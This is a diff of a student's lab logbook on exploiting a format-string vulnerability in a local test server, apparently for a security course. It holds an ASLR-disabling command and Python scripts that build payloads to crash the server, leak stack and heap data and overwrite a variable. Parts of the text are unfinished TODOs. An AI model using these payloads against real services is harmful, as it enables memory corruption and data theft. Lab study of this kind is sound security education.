@@ -1,10 +1,14 @@
 # Log Book 6
 
-## Disable adress randomization
+## Environment Setup
+
+### Disable adress randomization
 
 `sudo sysctl -w kernel.randomize_va_space=0`
 
-## Server output
+### Server output
+
+This is a sample output of the server.
 
 ```
 server-10.9.0.5 | Got a connection from 10.9.0.1
@@ -20,8 +24,13 @@ server-10.9.0.5 | hello
 server-10.9.0.5 | The target variable's value (after):  0x11223344
 server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
 ```
+## Task 1
 
-## Crash server
+For this task we had to construct a simple payload to exploit the format-string
+vulnerability in the server. By analyzing the program source code we can see that the 
+program reads user input into the buf variable. Then, this data is passde to 
+`myprintf()` to print out the data. We were able to crash the server by filling the 
+buf variable with multiple *%s*.
 
 ```py
 #!/usr/bin/python3
@@ -31,7 +40,6 @@ import sys
 N = 1500
 content = bytearray(0x0 for i in range(N))
 
-# This line shows how to store a 4-byte string at offset 4
 for i in range(0, N, 2):
   content[i:i+2] = ("%s").encode('latin-1')
 
@@ -39,8 +47,15 @@ for i in range(0, N, 2):
 with open('badfile', 'wb') as f:
   f.write(content)
 ```
+## Task 2
+### Task 2.A
 
-## Print first 4 bytes
+// TODO: How many %x
+
+The objective of this task is to print out the data on the stack and to print
+out the first four bytes of our input. To do this we started by choosing some
+unique numbers (4 bytes) so we can immediately tell when they are printed out.
+We chose 0xaabbccdd. The rest of the payload is filled with ?? *%x* format specifiers. 
 
 ```py
 #!/usr/bin/python3
@@ -63,11 +78,21 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-## Secret message
+![task 2A](./LOGBOOK6_img/task_2_A.png)
 
-Secret message: "A secret message"
+### Task 2.B
 
-```
+TODO
+
+For this task there was a secret message string stored in the heap area that we had 
+to find. For this task, the first four bytes of the payload were filled with
+the secret message address that was given. Then, our input is followed by ?? *%x* 
+format specifiers which will print out the data on the stack we finish by
+adding a *%s* format specifier that will print the secret message string.
+
+The secret message string was: "A secret message"
+
+```py
 #!/usr/bin/python3
 import sys
 
@@ -93,11 +118,15 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-### Task 3
+![task 2B](./LOGBOOK6_img/task_2_B.png)
 
-## Change target
+## Task 3
 
-```
+### Task 3.A
+
+TODO
+
+```py
 #!/usr/bin/python3
 import sys
 
@@ -123,9 +152,13 @@ with open('badfile', 'wb') as f:
   f.write(content)
 ```
 
-## Store 0x5000 on target
+![task 3A](./LOGBOOK6_img/task_3_A.png)
 
-```
+### Task 3.B
+
+TODO
+
+```py
 #!/usr/bin/python3
 import sys
 from math import floor
@@ -157,3 +190,5 @@ content[s_offset:s_offset+len(n_str)] = (n_str).encode('latin-1')
 with open('badfile', 'wb') as f:
   f.write(content)
 ```
+
+![task 3B](./LOGBOOK6_img/task_3_B.png)
